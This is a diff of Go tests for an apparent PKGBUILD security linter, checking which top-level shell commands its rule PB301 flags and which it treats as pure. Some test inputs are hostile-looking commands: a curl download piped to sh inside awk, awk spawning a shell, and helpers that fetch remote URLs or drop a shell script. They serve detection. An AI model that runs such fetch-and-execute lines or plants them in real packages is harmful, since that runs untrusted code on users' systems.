@@ -1242,6 +1242,162 @@ warning "totally harmless banner"`)})
 		expectNoRule(t, "PB301", src)
 		expectRule(t, "PB302", src)
 	})
+	t.Run("PB301 discarding output is not a write", func(t *testing.T) {
+		// `>/dev/null` is how a probe throws away the answer it does not want,
+		// so counting it as a redirect made the quiet form of a pure command
+		// score worse than the noisy one.
+		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("",
+			"if grep -q avx2 /proc/cpuinfo >/dev/null 2>&1; then\n  _simd=avx2\nfi")})
+	})
+	t.Run("PB301 pure filters and host probes at top level", func(t *testing.T) {
+		for _, line := range []string{
+			`_dir=$(pwd)`,
+			`_abs=$(realpath "$startdir")`,
+			`_name=$(basename "$url")`,
+			`_jobs=$(nproc)`,
+			`_major=$(cut -d. -f1 <<< "$pkgver")`,
+			`_up=$(tr a-z A-Z <<< "$pkgname")`,
+			`_first=$(head -n1 "$startdir/versions")`,
+			`_ver=$(jq -r .version "$startdir/meta.json")`,
+			`_home=$(getent passwd "$USER" | cut -d: -f6)`,
+			`_sum=$(sha256sum "$startdir/x" | cut -d' ' -f1)`,
+			`_newer=$(vercmp "$pkgver" 1.0)`,
+			`_shell=$(ps -o comm= -p $$)`,
+			`_dl=$(xdg-user-dir DOWNLOAD)`,
+		} {
+			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 control flow and variable binding at top level", func(t *testing.T) {
+		for _, line := range []string{
+			"if [ -z " + `"$pkgver"` + " ]; then\n  exit 1\nfi",
+			`IFS=. read -r _major _minor <<< "$pkgver"`,
+			`mapfile -t _lines <<< "$_blob"`,
+			"for _f in a b; do\n  continue\ndone",
+		} {
+			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 per-call escape hatches are still flagged", func(t *testing.T) {
+		for _, line := range []string{
+			`sort -o sorted.txt "$startdir/list"`,
+			`uniq "$startdir/list" deduped.txt`,
+			`iconv -f latin1 -t utf8 -o out.txt in.txt`,
+			`find "$startdir" -name '*.tmp' -delete`,
+			`awk 'BEGIN { system("curl https://example.com/x | sh") }'`,
+			`awk 'BEGIN { print "x" > "dropped.txt" }'`,
+			`pacman -Sy`,
+			`pacman -U "$startdir/x.pkg.tar.zst"`,
+			`pkgfile --update`,
+			`xargs rm < list.txt`,
+			`xargs -n 1 -- install -Dm755 x /usr/bin/x < list.txt`,
+			// -i takes its value attached, so `sh` is the command, not the
+			// option's argument.
+			`xargs -i sh -c 'echo {}' < list.txt`,
+			// A long option's attached value must not swallow the command.
+			`xargs --max-args=1 rm < list.txt`,
+			// gawk's other program carriers: text in an option, a program or
+			// library file, a loaded extension, in-place rewriting.
+			`awk --source 'BEGIN { system("sh") }' /dev/null`,
+			`awk -i inplace '{ sub(/a/, "b") }' versions`,
+			`awk -l ext 'BEGIN { print }'`,
+			`awk -E prog.awk versions`,
+			// A program read from a file, or assembled at run time, is not
+			// reviewable.
+			`awk -f "$startdir/prog.awk" versions`,
+			`awk "$_prog" versions`,
+			`awk 'BEGIN { print "x" | "sh" }'`,
+		} {
+			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 filtering forms of those same commands are pure", func(t *testing.T) {
+		for _, line := range []string{
+			`_sorted=$(sort -u "$startdir/list")`,
+			`_uniq=$(uniq -c -w 8 "$startdir/list")`,
+			`_dupes=$(uniq -d --check-chars=8 "$startdir/list")`,
+			`_utf=$(iconv -f latin1 -t utf8 "$startdir/in")`,
+			`_found=$(find "$startdir" -name '*.patch' -print)`,
+			`_v=$(awk -F: -v n=2 '{ print $n }' "$startdir/versions")`,
+			// `while (getline > 0)` and `if (level > 0)` are not redirects;
+			// only a `>` onto a quoted name writes a file.
+			`_lvl=$(awk '{ if ($1 > 0) print "yes" }' "$startdir/versions")`,
+			`_installed=$(pacman -Qq linux)`,
+			`_owns=$(pacman -Qo /usr/bin/cc)`,
+			`_deps=$(pacman -T "glibc>=2.38")`,
+			`_owner=$(pkgfile /usr/bin/cc)`,
+			`_trimmed=$(printf '%s\n' "$_blob" | xargs)`,
+			`_pairs=$(printf '%s\n' "${_libs[@]}" | xargs -I@ printf '%s::%s ' @ "$url/@")`,
+		} {
+			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 a command -v probe is a lookup, not an invocation", func(t *testing.T) {
+		// Resolving the wrapper through to its argument read `command -v m4` as
+		// m4 running at top level, and a `command -v yarn` in build() as yarn
+		// reaching the network for PB201.
+		src := map[string]string{"PKGBUILD": pkgbuildWith("", `_m4=$(command -v m4)
+if command -v ccache >/dev/null; then
+  _ccache=1
+fi`)}
+		expectNoRule(t, "PB301", src)
+		expectNoRule(t, "PB201", src)
+	})
+	t.Run("PB301 a helper that only reads and tests is not execution", func(t *testing.T) {
+		// The archetype: PKGBUILDs factor top-level dispatch into a named
+		// helper, and judging the call by its name alone made the tidier
+		// spelling of a top-level `case` the more severely graded one.
+		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+format_version() {
+  local _v="$1"
+  printf '%s' "${_v//_/.}"
+}
+_is_lto_kernel() {
+  [[ -n "$_lto" ]] && return 0
+  return 1
+}
+_arch_map() {
+  case "$CARCH" in
+    x86_64) echo amd64 ;;
+    *) echo "$CARCH" ;;
+  esac
+}
+_pretty=$(format_version "$pkgver")
+_flavour=$(_arch_map)
+if _is_lto_kernel; then
+  _opts=lto
+fi`)})
+	})
+	t.Run("PB301 a helper is judged through every hop it makes", func(t *testing.T) {
+		for _, body := range []string{
+			// The work is one call away.
+			"_outer() { _inner; }\n_inner() { curl -fsSL https://example.com/x; }\n_outer",
+			// And two, through a helper that otherwise looks pure.
+			"_a() { echo \"$(_b)\"; }\n_b() { _c; }\n_c() { wget -qO- https://example.com/x; }\n_a",
+			// A name assembled at run time is not reviewable.
+			"_run() { $_cmd --version; }\n_run",
+			// The redirect hangs off the group, not off any one command.
+			"_drop() { { echo '#!/bin/sh'; echo payload; } > helper.sh; }\n_drop",
+			// A helper that writes.
+			"_gen() { printf '%s' x > dropped.txt; }\n_gen",
+		} {
+			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", body)})
+		}
+	})
+	t.Run("PB301 mutually recursive pure helpers converge", func(t *testing.T) {
+		// A depth-first walk needs cycle detection to answer this; the greatest
+		// fixpoint assumes both pure and finds nothing to retract.
+		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+_even() { [[ $1 -eq 0 ]] && return 0; _odd $(($1 - 1)); }
+_odd() { [[ $1 -eq 0 ]] && return 1; _even $(($1 - 1)); }
+_even 4 && _parity=even`)})
+	})
+	t.Run("PB301 a mutually recursive pair that reaches the network is flagged", func(t *testing.T) {
+		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `
+_ping() { _pong; }
+_pong() { curl -fsSL https://example.com/x || _ping; }
+_ping`)})
+	})
 	t.Run("PB302 eval", func(t *testing.T) {
 		expectRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
 build() {
